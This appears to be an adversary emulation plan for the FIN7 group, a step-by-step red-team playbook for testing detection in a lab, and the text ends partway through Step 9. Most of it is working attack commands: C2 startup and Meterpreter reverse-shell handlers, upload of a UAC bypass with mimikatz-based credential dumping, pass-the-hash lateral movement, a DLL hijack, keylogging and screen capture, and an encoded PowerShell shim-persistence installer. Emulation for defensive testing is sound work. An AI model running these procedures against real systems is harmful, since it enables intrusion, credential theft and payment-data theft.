# Preface

For the purpose of this emulation plan, FIN7 operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.

While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that does **not** have protective/preventative defense measures enabled, so as to assess detection capabilities. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives.

This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found [here](/fin7/Resources/placeholder_substitution). 

---

# Scenario 1 Overview - Detections

* Emulation of FIN7 usage of tools such as SQLRat, BABYMETAL, BOOSTWRITE, and PILLOWMINT
* Scenario begins after delivery of a reverse shell payload distributed via spearphishing
* Targeted attack of a hospitality organization with the explicit goal of credit card theft
* Designed to assess detection capabilities

## Contents

* [Step 0 - Start C2 Server](#step-0---start-c2-server)
* [Step 1 - Initial Breach](#step-1---initial-breach-evaluations-step-11)
* [Step 2 - Delayed Malware Execution](#step-2---delayed-malware-execution-evaluations-step-12)
* [Step 3 - Target Assessment](#step-3---target-assessment-evaluations-step-13)
* [Step 4 - Staging Interactive Toolkit](#step-4---staging-interactive-toolkit-evaluations-step-14)
* [Step 5 - Escalate Privileges](#step-5---escalate-privileges-evaluations-step-15)
* [Step 6 - Expand Access](#step-6---expand-access-evaluations-step-16)
* [Step 7 - Setup User Monitoring](#step-7---setup-user-monitoring-evaluations-step-17)
* [Step 8 - User Monitoring](#step-8---user-monitoring-evaluations-step-18)
* [Step 9 - Setup Shim Persistence](#step-9---setup-shim-persistence-evaluations-step-19)
* [Step 10 - Steal Payment Data](#step-10---steal-payment-data-evaluations-step-20)


## Pre-requisites
Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 1 Infrastructure](/fin7/Emulation_Plan/Scenario_1/Infrastructure.md) documentation.

## Step 0 - Start C2 Server

Before the scenario begins, the attacker needs to start their C2 server to catch their first beacon from the target.

### Procedures

On the `Windows Attack Platform`:

1. Open command prompt and `cd` to the `c2fin7.exe` binary

2. Execute the following command
    ```
    [ATT&CK RAT]> C:\c2fin7.exe -server 192.168.0.6
    ```
   
On the `Linux Attack Platform`:

1. Start `tmux`
    ```
    tmux
    ```

## Step 1 - Initial Breach (Evaluations Step 11)

The scenario begins with an initial breach where a legitimate user ([T1204](https://attack.mitre.org/techniques/T1204/)) opens an RTF document and double clicks text that says "Double Click Here to Unlock Contents". The RTF file contains an embedded Visual Basic payload ([T1027](https://attack.mitre.org/techniques/T1027/)). After double clicking the text block, `mshta.exe` executes ([T1170](https://attack.mitre.org/techniques/T1218/005/)) the Visual Basic payload([T1059](https://attack.mitre.org/techniques/T1059/005/)).
`mshta.exe` then assembles embedded text within the RTF file into a JavaScript payload. Next, `mshta.exe` makes a copy of the legitimate `wscript.exe` on disk as `Adb156.exe` ([T1036](https://attack.mitre.org/techniques/T1036/)). `winword.exe` spawns `verclsid.exe` ([T1175](https://attack.mitre.org/techniques/T1175/)). `mshta.exe` loads `taskschd.dll` and creates a scheduled task to execute in 5 minutes ([T1053](https://attack.mitre.org/techniques/T1053/)).

### Procedures

#### 1.A - User Execution: Malicious File (with licensed Microsoft Word) ([T1204.002](https://attack.mitre.org/techniques/T1204/002/))

If testing with Microsoft Word, perform the following. If not, perform [Step 1.A*](#1a---user-execution-malicious-file-without-a-microsoft-word-license) instead.

On the `Linux Attack Platform`:

1. Copy `2-list.rtf` to `<domain_admin>`'s Desktop on `hotelmanager`.
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hotelmanager_ip>/C$ -c "put fin7/Resources/Step1/SQLRat/2-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\2-list.rtf"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On `hotelmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hotelmanager_ip>
    ```

2. Double-click `2-list.rtf` located on `<domain_admin>`'s desktop

3. Decline any spurious prompts, including updating document with linked data

4. Double click the **text** that says "Double Click Here To Unlock Contents"

5. When prompted to run an `lnk` file, click "open"

6. Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe

#### 1.A* - User Execution: Malicious File (without a Microsoft Word license)

Perform the following if you're testing without Office licenses:

On the `Linux Attack Platform`:

1. Upload `2-list.rtf`, `unprotectedNoWord.lnk`, and `obfuscated-payload.vbs` to `hotelmanager` as `2-list.rtf`, `2-list.lnk`, and `payload.vbs` respectively
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hotelmanager_ip>/C$ -c "put fin7/Resources/Step1/SQLRat/2-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\2-list.rtf; put /home/<attacker>/fin7/Resources/Step1/unprotectedNoWord.lnk Users\\<domain_admin>.<domain>\\Desktop\\2-list.lnk; put /home/<attacker>/fin7/Resources/Step1/obfuscated-payload.vbs Users\\<domain_admin>.<domain>\\AppData\\Local\\payload.vbs"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On `hotelmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hotelmanager_ip>
    ```
   
2. Double-click `2-list.rtf` located on `<domain_admin>`'s desktop

3. Decline any spurious prompts, including updating document with linked data

4. Double click `2-list.lnk` on `<domain_admin>`'s Desktop

5. Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe

### Cited Intelligence

* FIN7 has created malicious DOCX and RTF lures that convince users to double-click on an image in the document. When a user double-clicks an image, an embedded malicious LNK file is spawned that launches mshta.exe, which executes a VBScript one-liner to decode a script hidden in the document. <sup>[4](https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/)</sup>

* FIN7 has copied wscript.exe into %LOCALAPPDATA% and renamed it. <sup>[3](https://labs.sentinelone.com/fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/),[25](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)</sup>

---

## Step 2 - Delayed Malware Execution (Evaluations Step 12)

The previously created scheduled task spawns `Adb156.exe` via `svchost` ([T1053.005](https://attack.mitre.org/techniques/T1053/005/)). 
`Adb156.exe` then loads `scrobj.dll` and executes [`sql-rat.js`](/fin7/Resources/Step1/sql-rat.js) via jscript ([T1059.7](https://attack.mitre.org/techniques/T1059/007/)).
Next, Adb156.exe then connects to 192.168.0.6 via MSSQL transactions ([T1071](https://attack.mitre.org/techniques/T1071)) (TCP port 1433).
Finally, FIN7 performs WMI queries to obtain network configuration information ([T1016](https://attack.mitre.org/techniques/T1016/)) and system information ([T1082](https://attack.mitre.org/techniques/T1082/)).

### Procedures

#### 2.A - SQLRat Execution via Scheduled Task ([T1053.005](https://attack.mitre.org/techniques/T1053/005/))

On the `Windows Attack Platform`:

1. To verify that you have a new session on `hotelmanager` from your C2 server, run the following command to get the MAC of `hotelmanager`
    ```
    [ATT&CK RAT]> get-mac-serial
    ```

#### 2.B - Upload Powershell Stager
 
1. Upload the [PowerShell stager](/fin7/Resources/Step2/stager.ps1) via SQLRat.
    ```
    [ATT&CK RAT]> upload-file C:\\stager.ps1 C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\stager.ps1
    ```

### Cited Intelligence
* FIN7 has created scheduled tasks to establish persistence. <sup>[23](https://blog.morphisec.com/fin7-attacks-restaurant-industry),[4](https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/)</sup>

* SQLRat has dropped files and executed SQL scripts on a host system. <sup>[5](https://www.flashpoint-intel.com/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/)</sup>

* FIN7 has deployed a custom "profiling" script to fingerprint the machine and network environment. <sup>[3](https://labs.sentinelone.com/fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/)</sup>

* SQLRat has downloaded a powershell script through MSSQL transactions. <sup>[5](https://www.flashpoint-intel.com/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/)</sup>

---

## Step 3 - Target Assessment (Evaluations Step 13)

Adb156.exe makes WMI queries for process discovery ([T1057](https://attack.mitre.org/techniques/T1057/)).
Next, Adb156.exe spawns `cmd.exe` to execute `net view` ([T1135](https://attack.mitre.org/techniques/T1135/)). 
As a defensive evasion tactic, FIN7 leverages Adb156.exe to query for virtualization/sandbox 
information ([T1497](https://attack.mitre.org/techniques/T1497/)). FIN7 then leverages Adb156.exe to query the `USERNAME` 
environment variable ([T1033](https://attack.mitre.org/techniques/T1033/)) and the `COMPUTERNAME` ([T1082](https://attack.mitre.org/techniques/T1082/)) 
environment variable.

Adb156.exe accesses the Windows Script Host ADSystemInfo Object COM object by 
loading `adsldp.dll` then calling the `DllGetClassObject()` API ([T1082](https://attack.mitre.org/techniques/T1082)).
Next, Adb156.exe makes another WMI query for System Network Configuration discovery ([T1016](https://attack.mitre.org/techniques/T1016/)) and System Information Discovery ([T1082](https://attack.mitre.org/techniques/T1082/)).

Finally, Adb156.exe downloads takeScreenshot.ps1 from 192.168.0.6 via MSSQL transactions.
FIN7 then spawns cmd.exe ([T1059](https://attack.mitre.org/techniques/T1059/)) and then launches powershell.exe ([T1086](https://attack.mitre.org/techniques/T1086/)).
FIN7 leverages powershell to execute a script that performs a screen capture ([T1113](https://attack.mitre.org/techniques/T1113/)) of the local desktop. 
Then, the screenshot is uploaded  to 192.168.0.6 via MSSQL transactions ([T1041](https://attack.mitre.org/techniques/T1041/)).

### Procedures

#### 3.A - Local Discovery ([T1057](https://attack.mitre.org/techniques/T1057/), [T1135](https://attack.mitre.org/techniques/T1135/), [T1497](https://attack.mitre.org/techniques/T1497/), [T1033](https://attack.mitre.org/techniques/T1033), [T1082](https://attack.mitre.org/techniques/T1082/), [T1016](https://attack.mitre.org/techniques/T1016/))

On the `Windows Attack Platform`:

1. Perform initial system triage
    ```
    [ATT&CK RAT]> enum-system
    ```

#### 3.B - Screen Capture ([T1105](https://attack.mitre.org/techniques/T1105), [T1059.003](https://attack.mitre.org/techniques/T1059/003), [T1059.001](https://attack.mitre.org/techniques/T1059/001), [T1113](https://attack.mitre.org/techniques/T1113), [T1041](https://attack.mitre.org/techniques/T1041/))

1. Upload screenshot utility to take screenshot of user's desktop
    ```
    [ATT&CK RAT]> upload-file C:\\takeScreenshot.ps1 C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\takeScreenshot.ps1
    ```

2. Execute the `takescreenshot.ps1` PowerShell script
    ```
    [ATT&CK RAT]> exec-cmd "powershell.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\takeScreenshot.ps1"
    ```

3. Download the screenshot
    ```
    [ATT&CK RAT]> download-file C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\Temp\\image.png C:\\image.png
    ```

### Cited Intelligence
* HALFBAKED has been utilized to listen for commands from the C2 server to carry out tasks such as sending victim machine information and listing processes running. <sup>[25](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)</sup>

* FIN7 has deployed capabilities that allow the operators to take a screenshot of the remote system. <sup>[25](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html), [4](https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/)</sup>

---

## Step 4 - Staging Interactive Toolkit (Evaluations Step 14)

The stager uploaded in stage-1 is now executed which results in a Meterpreter shell (BABYMETAL) which is used for this step. Adb156.exe spawns cmd.exe([T1059](https://attack.mitre.org/techniques/T1059/003/)) which then spawns powershell.exe([T1086](https://attack.mitre.org/techniques/T1059/001/)).  `powershell.exe` then decodes an embedded DLL payload ([T1140](https://attack.mitre.org/techniques/T1140/)) which is executed via the PowerShell cmdlet `Invoke-Expression` ([T1086](https://attack.mitre.org/techniques/T1086/)). Finally, powershell.exe loads shellcode into memory([T1140](https://attack.mitre.org/techniques/T1140/)) from a data received via a network connection made to port 443 on the C2 server ([T1071](https://attack.mitre.org/techniques/T1071/), [T1032](https://attack.mitre.org/techniques/T1032/)). 

### Procedures

#### 4.A - Staging Interactive Toolset ([T1086](https://attack.mitre.org/techniques/T1059/001))

On the `Linux Attack Platform`:

1. Start Metasploit
    ```
    sudo msfconsole
    ```

1. Start a Meterpreter handler on port 443
    ```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set lport 443
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```

On the `Windows Attack Platform`:

1. Execute the stager.ps1 script and wait for the Meterpreter callback
    ```
    [ATT&CK RAT]> exec-cmd "powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\stager.ps1"
    ```
   
You should receive a new Meterpreter session on the `Linux Attack Platform`.


### Cited Intelligence
* FIN7 has executed a PowerShell script to decode and inject shellcode via an embedded DLL into memory. <sup>[23](https://blog.morphisec.com/fin7-attacks-restaurant-industry), [4](https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/), [18](https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor)</sup>

---

## Step 5 - Escalate Privileges (Evaluations Step 15)

FIN7 leverages powershell.exe to execute the `CreateToolHelp32Snapshot()`([T1057](https://attack.mitre.org/techniques/T1057/)) Win32 API for process discovery. Next, `samcat.exe` (a modified version of mimikatz) and `uac-samcats.ps1` are downloaded from the C2 server via powershell.exe ([T1507](https://attack.mitre.org/techniques/T1507/)). FIN7 then executes the `uac-samcats.ps1`. This in turn spawns powershell.exe from powershell.exe([T1086](https://attack.mitre.org/techniques/T1086/)) followed 
by executing samcat.exe as a high integrity process ([T1088](https://attack.mitre.org/techniques/T1088/)). The `samcat.exe` executable reads local credentials from SAM ([T1003.001](https://attack.mitre.org/techniques/T1003/001/)). Then `powershell.exe` executes the `GetIpNetTable()`([T1016](https://attack.mitre.org/techniques/T1016))
API to identify ARP entires. `powershell.exe` then spawns `nslookup.exe` to query `hoteldc` (<hoteldc_ip>) for an IP identified from the ARP entry ([T1018](https://attack.mitre.org/techniques/T1018/)).

* *Note, SamCats is a modified version of mimikatz that just runs Mimikatz SAM dumping components*

### Procedures

#### 5.A - Enumerate-Processes, Execute SamCats, and Discover ITAdmin ([T1059.001](https://attack.mitre.org/techniques/T1059/001), [T1140](https://attack.mitre.org/techniques/T1140), [T1071.001](https://attack.mitre.org/techniques/T1071/001), [T1573.002](https://attack.mitre.org/techniques/T1573/002))

On the `Linux Attack Platform`:

1. Interact with the recently obtained Meterpreter session
    ```
    msf > sessions -i 1
    ```

2. List processes
    ```
    meterpreter > ps -ax 
    ```

3. Upload `samcat.exe` (modified Mimikatz) and `uac-samcats.ps1` (UAC Bypass script) to `hotelmanager`
    ```
    meterpreter > upload /home/<attacker>/fin7/Resources/Step5/samcat.exe "C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\samcat.exe"
    ```
    ```
    meterpreter > upload /home/<attacker>/fin7/Resources/Step5/uac-samcats.ps1 "C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\uac-samcats.ps1"
    ```

5. Execute the UAC bypass script
    ```
    meterpreter > execute -f powershell.exe -H -i -a "-c C:\Users\<domain_admin>.<domain>\AppData\Local\uac-samcats.ps1"
    ```
   
    Wait for the script to return. You should see credentials dumped to the screen.

6. Discover ARP entries
    ```
    meterpreter > arp
    ```

7. Perform `nslookup` against `itadmin`
    ```
    meterpreter > execute -f nslookup.exe -H -i -a "<itadmin_ip>"
    ```

### Cited Intelligence
* FIN7 has used memory scrapers such as mimikatz to dump the passwords of logged on users. <sup>[9](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf), [6](https://www.deepwatch.com/blog/profile-of-an-adversary-fin7/)</sup>

* The Carbank malware has contained a UAC bypass. <sup>[10](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf)</sup>

* FIN7 has used tools such as PowerSploit to pivot to additional hosts. <sup>[6](https://www.deepwatch.com/blog/profile-of-an-adversary-fin7/)</sup>

---

## Step 6 - Expand Access (Evaluations Step 16)

Step 6A begins by downloading `paexec.exe` and `hollow.exe` via powershell.exe ([T1105](https://attack.mitre.org/techniques/T1105/)) to 
`AppData\Local\` of the current Meterpreter session user. Next, FIN7 interactes with with the target through Meterpreter spawning powershell.exe from cmd.exe ([T1059.003](https://attack.mitre.org/techniques/T1059/003)). The password hash obtained from `samcats.exe` is leveraged by paexec([T1021.002](https://attack.mitre.org/techniques/T1021/002)) to copy `hollow.exe` onto the IT Admin host as user kmitnick The executable `paexec.exe` starts a temporary Windows service([T1035](https://attack.mitre.org/techniques/T1569/002)) during the copying process called `PAExec-{PID}-{HOSTNAME}.exe` which executes the hollow.exe ([T1021.002](https://attack.mitre.org/techniques/T1021/002)). The executable `hollow.exe` spawns svchost.exe and unmaps its memory image ([T1055.012](https://attack.mitre.org/techniques/T1055/012)). Then, svchost exchanges data with 192.168.0.4 over HTTPS protocols ([T1071.001](https://attack.mitre.org/techniques/T1071/001), [T1573.002](https://attack.mitre.org/techniques/T1573/002)).  

### Procedures

#### 6.A - Expand Access ([T1105](https://attack.mitre.org/techniques/T1105), [T1059.003](https://attack.mitre.org/techniques/T1059/003), [T1078.002](https://attack.mitre.org/techniques/T1078/002), [T1021.002](https://attack.mitre.org/techniques/T1021/002), [T1569.002](https://attack.mitre.org/techniques/T1569/002), [T1055.012](https://attack.mitre.org/techniques/T1055/012))

On the `Linux Attack Platform`:

1. Upload the lateral movement utility, `paexec.exe` 
    ```
    meterpreter > upload /home/<attacker>/fin7/Resources/Step6/paexec.exe "C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\paexec.exe"
    ```

2. Upload the `hollow.exe` (process hollowing) executable
    ```
    meterpreter > upload /home/<attacker>/fin7/Resources/Step6/hollow.exe "C:\\Users\\<domain_admin>.<domain>\\AppData\\Local\\hollow.exe"
    ```

3. Drop into an interactive session on the target host
    ```
    meterpreter > shell
    ```

4. Change directory to `C:\Users\<domain_admin>.<domain>\AppData\Local`
    ```
    cmd > cd "C:\Users\<domain_admin>.<domain>\AppData\Local"
    ```

5. Use `paexec.exe` to perform pass-the-hash to execute `hollow.exe` on `itadmin`
    ```
    cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc ".\hollow.exe" hollow.exe
    ```

    Wait to receive a new Meterpreter session and for `paexec` to return.
    
    `paexec` never finishes execution, press enter a few times and wait for the prompt to return.
    
6. Exit the CMD prompt from within the Meterpreter session
    ```
    cmd > exit
    ```
   
7. Background the current Meterpreter session
    ```
    meterpreter > background
    ```

### Cited Intelligence
* FIN7 has used PAExec to execute remote commands and move laterally within an environment. <sup>[9](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf), [6](https://www.deepwatch.com/blog/profile-of-an-adversary-fin7/)</sup>

* FIN7 has performed process injection to execute malicious payloads from memory. <sup>[19](https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/), [13](https://www.rsa.com/content/dam/en/white-paper/the-carbanak-fin7-syndicate.pdf)</sup>

---

## Step 7 - Setup User Monitoring (Evaluations Step 17)

Step 7 focuses on emulating the DLL Hijacking and module execution functionality of BOOSTWRITE. This step starts by creating a BOOSTWRITE Meterpreter handler as well as staging a temporary Python HTTP server hosting an index.html page with the ASCII character "B".  Next, `svchost.exe` (Meterpreter session obtained via `hollow.exe` execution) downloads BOOSTWRITE.dll to `C:\Windows\SysWOW64\srrstr.dll` ([T1105](https://attack.mitre.org/techniques/T1105/)). The "srrstr.dll" DLL is [masquerading]([T1036.005](https://attack.mitre.org/techniques/T1036/005))) to match the legitimate name of srrstrl.dll which is found in `C:\Windows\System32`. Next, `cmd.exe` 
spawns from `svchost.exe`([T1059.003](https://attack.mitre.org/techniques/T1059/003))) which executes `SystemPropertiesAdvanced.exe` 
that in turn loads and executes the malicious `srrstr.dll`([T1574](https://attack.mitre.org/techniques/T1574/001))). `After srrstr.dll` 
has been loaded and executed, `rundll32.exe` is spawned as a child process to communicate with the C2 server over HTTPs protocol on port 8080 ([T1071](https://attack.mitre.org/techniques/T1071/001)), [T1573](https://attack.mitre.org/techniques/T1573/002))) granting a new shell to the adversary.  

### Procedures

#### 7.A - Boostwrite ([T1105](https://attack.mitre.org/techniques/T1105), [T1036.005](https://attack.mitre.org/techniques/T1036/005), [T1059.003](https://attack.mitre.org/techniques/T1059/003), [T1574.001](https://attack.mitre.org/techniques/T1574/001), [T1071.001](https://attack.mitre.org/techniques/T1071/001), [T1573.002](https://attack.mitre.org/techniques/T1573/002))

On the `Linux Attack Platform`:

1. Open a new `tmux` window
    ```
    Ctrl+b c
    ```

2. Setup a Python SimpleHTTPServer to host the XOR key
    ```
    echo "B" > /tmp/index.html; cd /tmp/; sudo python3 -m http.server 80
    ```

3. Switch back to the Metasploit terminal
    ```
    Ctrl+b n
    ```

4. Setup a Meterpreter handler on 8080 for the BOOSTWRITE shell
    ```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```

5. Switch to the newly received Meterpreter shell created by hollow.exe
    ```
    [msf]> sessions -i 2
    ```

6. Upload `BOOSTWRITE.dll` to `C:\Windows\Syswow64\`
    ```
    meterpreter > upload /home/<attacker>/fin7/Resources/Step7/BOOSTWRITE.dll "C:\\Windows\\SysWOW64\\srrstr.dll"
    ```

7. Launch `SystemPropertiesAdvanced.exe` to execute the DLL hijack
    ```
    meterpreter > execute -f "cmd.exe /c C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
    ```

    You should receive a new Meterpreter session.
    
8. Switch back to the Python HTTP Server `tmux` window
    ```
    Ctrl+b n
    ```
   
9. Stop the Python HTTP Server, we no longer need it
    ```
    Ctrl+c
    ```
   
10. Exit the HTTP Server `tmux` window
    ```
    exit
    ```

### Cited Intelligence
* BOOSTWRITE is a loader that has been launched via abuse of the DLL search order of applications which load legitimate services. This has included matching names of legitimate DLLs to force applications to import BOOSTWRITE DLLs instead of the legitimate DLLs.<sup>[2](https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html)</sup>

---

## Step 8 - User Monitoring (Evaluations Step 18)

Step 8 focuses on emulating user monitoring activity. Adversary emulation begins by migrating into `explorer.exe` from 
`svchost.exe`([T1055](https://attack.mitre.org/techniques/T1055)). Next, the metasploit [screenspy](https://github.com/rapid7/metasploit-framework/blob/master/scripts/meterpreter/screenspy.rb) module is leveraged for screen capture ([T1113](https://attack.mitre.org/techniques/T1055)). Upon completing screencapture, the Meterpreter session is then migrated into mstsc.exe ([T1056.001](https://attack.mitre.org/techniques/T1056/001)) and a keylogger is deployed via Meterpreter ([T1056.001](https://attack.mitre.org/techniques/T1056/001)). 

### Procedures

#### 8.A - User Monitoring ([T1055](https://attack.mitre.org/techniques/T1055), [T1113](https://attack.mitre.org/techniques/T1113), [T1055](https://attack.mitre.org/techniques/T1055), [T1056.001](https://attack.mitre.org/techniques/T1056/001))

On `itadmin`, begin roleplaying as the legitimate `<domain_admin>` user:

1. Log in to `itadmin` as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:<itadmin_ip>
    ```
   
2. Open the Remote Desktop Connection client
    ```
    windows key (or type in search) > mstsc.exe > enter
    ```

On the `Linux Attack Platform`:

1. Background the current Meterpreter session
    ```
    meterpreter > background
    ```

2. Perform 180 screen captures using Metasploit's `screen_spy` module through the `hollow.exe` Meterpreter session.
    ```
    use post/windows/gather/screen_spy
    set COUNT 180
    set DELAY 1
    set VIEW_SCREENSHOTS false
    set SESSION 2
    exploit
    ```
   
3. Wait for the `screen_spy` module to complete, then confirm that the screenshots were recorded.
    ```
    msf> loot -t screenspy.screenshot
    ```
   
4. Interact with the `hollow.exe` Meterpreter session
    ```
    msf> sessions -i 2
    ```

5. Migrate into `mstsc.exe` (RDP client)
    ```
    meterpreter > migrate -N mstsc.exe
    ```
   
6. Start keylogging within `mstsc.exe`
    ```
    meterpreter > keyscan_start
    ```

Switch back to `itadmin` and continue roleplaying as the legitimate `<domain_admin>` user:

1. Enter an RDP session using the `mstsc.exe` RDP client
    ```
    IP Address:     <accounting_ip>
    Username:       <domain>\<domain_admin>
    Password:       <domain_admin_password>
    ```

Back on the `Linux Attack Platform`:

1. Dump the logged keys
    ```
    meterpreter > keyscan_dump
    ```

2. Stop the keylogging process
    ```
    meterpreter > keyscan_stop
    ```

### Cited Intelligence
* The Carbanak malware is capable of recording video of a victim's desktop and performining keylogging. <sup>[7](https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-four-desktop-video-player.html), [21](https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html)</sup>

---

## Step 9 - Setup Shim Persistence (Evaluations Step 19)

Step 9 focuses on emulating persistence techniques. Adversary emulation begins with a valid logon to the accounting workstation as user kmitnick ([T078](https://attack.mitre.org/techniques/T078/003)). After establishing a RDP session from `itadmin` to `accounting` over TCP port 3389 ([T1021](https://attack.mitre.org/T1021/001), [T1090](https://attack.mitre.org/1090)). `powershell.exe` is spawned from `powershell.exe`([T1059](https://attack.mitre.org/T1059/001)). 

The `powershell.exe` executable then executes base64 encoded commands ([T1027](https://attack.mitre.org/T1027)) to download `dll329.dll` and `sdbE376` from the C2 server ([T1105](https://attack.mitre.org/techniques/T1105/)). The executable `sdbinst.exe` is then used to install `sdbE376.tmp` for 
application shimming ([T1546.011](https://attack.mitre.org/techniques/T1546/011)).

### Procedures

#### 9.A - Pivot to Accounting ([T1078.003](https://attack.mitre.org/techniques/T1078/003), [T1021](https://attack.mitre.org/techniques/T1021/001), [T1090](https://attack.mitre.org/techniques/T1090), [T1059.001](https://attack.mitre.org/techniques/T059/001), [T1027](https://attack.mitre.org/techniques/T1027))

On the `Linux Attack Platform`:

1. Background the current Meterpreter session
    ```
    meterpreter > background
    ```

2. Create a `reverse_https` Meterpreter listener on port 53
    ```
    msf > handler -p windows/meterpreter/reverse_https -H 192.168.0.4 -P 53
    ```

2. Interact with your Boostwrite shell on `itadmin` 
    ```
    msf > sessions -i 3
    ```
   
3. Create a portfwd to tunnel port 3389 from the `Linux Attack Platform` to the `Accounting` workstation
    ```
    meterpreter > portfwd add -l 3389 -p 3389 -r <accounting_ip>
    ```
   
4. Background this Meterpreter session
    ```
    meterpreter > background
    ```

On your `Ubuntu` machine:

3. RDP to `accounting` through the TCP tunnel from the `Linux Attack Platform`, mounting a local folder as a drive
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:192.168.0.4 /drive:X,/home/attack/fin7/Resources/Step9
    ```

#### 9.B - Setup Shim Persistence ([T1105](https://attack.mitre.org/techniques/T1105), [T1546.011](https://attack.mitre.org/techniques/T1546/011))

On `accounting`:

1. Open an administrative PowerShell session

2. Paste and run the following encoded PowerShell command to prep and install the application shim
    ```
    powershell > powershell -noprofile -encodedCommand "JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA=="
    ```

    *Note*: this PowerShell command places the files needed for the shim persistence into the `C:\Windows\Temp` directory, adds a registry key for the DLL to be installed as a shim to `HKLM:\Software\Microsoft\DRM\`, and lastly runs `sdbinst.exe` to perform the installation.

### Cited Intelligence
